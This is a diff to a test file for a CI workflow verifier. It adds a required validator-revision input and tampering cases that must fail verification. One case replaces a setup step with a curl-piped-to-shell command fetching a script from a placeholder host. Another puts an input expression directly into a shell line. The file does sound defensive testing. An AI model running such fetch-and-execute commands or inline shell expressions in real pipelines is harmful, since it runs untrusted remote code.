@@ -15,6 +15,7 @@ const validatorAvailable = existsSync(
   resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs'),
 );
 const matrixPlatformExpression = '${' + '{ matrix.platform }}';
+const validatorInputExpression = '${' + '{ inputs.validator_revision }}';
 
 function sha256(bytes: string | Buffer): string {
   return createHash('sha256').update(bytes).digest('hex');
@@ -56,7 +57,7 @@ async function workflowFixture() {
       aggregationJobName: 'aggregate-conformance',
       aggregationRunnerLabels: ['ubuntu-24.04'],
       environment: 'client-v1-conformance',
-      environmentId: '1',
+      environmentId: '20863036831',
       artifactNameTemplate: 'client-v1-conformance-{platform}',
       recordPathTemplate: '.artifacts/client-v1-conformance-{platform}.json',
       sourceRef: 'refs/heads/main',
@@ -85,6 +86,13 @@ async function workflowFixture() {
 describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow', () => {
   test('matches the exact frozen SDK workflow graph', async () => {
     const fixture = await workflowFixture();
+    expect(fixture.workflow).toContain('      validator_revision:');
+    expect(fixture.workflow).toContain('        required: true');
+    expect(fixture.workflow).toContain('        type: string');
+    expect(fixture.workflow).toContain(
+      `          OPENCOVEN_VALIDATOR_REVISION: ${validatorInputExpression}`,
+    );
+    expect(fixture.workflow).toContain('--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"');
     expect(() =>
       fixture.verifyProtectedWorkflow(fixture.workflow, fixture.producer, fixture.toolchain),
     ).not.toThrow();
@@ -97,6 +105,52 @@ describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow',
         workflow.replace(
           '      - uses: actions/upload-artifact@',
           '      - if: false\n        uses: actions/upload-artifact@',
+        ),
+    ],
+    [
+      'missing validator input',
+      (workflow: string) =>
+        workflow.replace(
+          [
+            '    inputs:',
+            '      validator_revision:',
+            '        required: true',
+            '        type: string',
+            '',
+          ].join('\n'),
+          '',
+        ),
+    ],
+    [
+      'optional validator input',
+      (workflow: string) => workflow.replace('        required: true', '        required: false'),
+    ],
+    [
+      'defaulted validator input',
+      (workflow: string) =>
+        workflow.replace('        type: string', '        type: string\n        default: main'),
+    ],
+    [
+      'direct validator expression in shell',
+      (workflow: string) =>
+        workflow.replace('"$OPENCOVEN_VALIDATOR_REVISION"', `"${validatorInputExpression}"`),
+    ],
+    [
+      'changed validator environment name',
+      (workflow: string) =>
+        workflow.replace('OPENCOVEN_VALIDATOR_REVISION:', 'UNREVIEWED_VALIDATOR_REVISION:'),
+    ],
+    [
+      'disabled Linux Secret Service setup',
+      (workflow: string) =>
+        workflow.replace("        if: matrix.platform == 'linux-x64'", '        if: false'),
+    ],
+    [
+      'substituted Linux Secret Service setup',
+      (workflow: string) =>
+        workflow.replace(
+          'node scripts/phase1-linux-secret-service.mjs --install',
+          'curl https://example.invalid/install.sh | sh',
         ),
     ],
     [
